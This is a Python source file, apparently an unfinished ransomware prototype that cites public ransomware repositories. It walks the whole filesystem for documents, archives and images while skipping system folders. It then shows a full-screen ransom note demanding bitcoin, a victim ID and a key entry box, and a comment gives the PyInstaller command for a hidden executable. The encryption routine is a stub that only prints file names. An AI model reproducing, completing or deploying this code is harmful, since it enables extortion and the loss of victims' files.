import os
import random
import threading
import queue
import socket
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import *


#https://github.com/Malwareman007/Ransomware/blob/main/Encrypter.py
#https://github.com/HugoLB0/Ransom0/blob/master/ransom0.py
#python -m PyInstaller --onefile -w encrypt.py
digits = random.randint(1111,9999) 
class ransomware:
    EXCLUDED_DIRECTORIES = ('Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            'logs',
            )
    
    EXTENSIONS = (
            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
            '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
    )
    
    def find_files(self):
        abs_files = []
        for root, dirs, files in os.walk("/"):
            if any(s in root for s in self.EXCLUDED_DIRECTORIES):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        abs_files.append(TARGET)
                        
        #for file in (abs_files):
        #    print(file)
        return abs_files
    
    def encrypt(self, filename):
        for file in filename:
            print(file)

ransomware = ransomware()
encrypt_files = ransomware.find_files()
ransomware.encrypt(encrypt_files)
root= tk.Tk()
width = root.winfo_screenwidth() # Get screen width
height = root.winfo_screenheight() # Get screen height


canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
canvas1.pack()

label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
label1.config(font=('helvetica', int(height/20)))
label1.config(background='black', foreground='red')
canvas1.create_window(int(width/2), int(height/15), window=label1)

label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.') # Title
label1.config(font=('helvetica', int(height/50)))
label1.config(background='black', foreground='red')
canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


label1 = tk.Label(root, text='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com') # Title
label1.config(font=('helvetica', int(height/50)))
label1.config(background='black', foreground='red')
canvas1.create_window(int(width/2), int(height/20)*9, window=label1)

label1 = tk.Label(root, text='YOUR DIGITS IS {}'.format(digits))# Display digits
label1.config(font=('helvetica', int(height/50)))
label1.config(background='black', foreground='red')
canvas1.create_window(int(width/2), int(height/20)*10, window=label1)



label1 = tk.Label(root, text='KEY:') # Title
label1.config(font=('helvetica', int(height/50)))
label1.config(background='black', foreground='red')
canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
entry1 = tk.Entry (root) 
canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)
root.mainloop()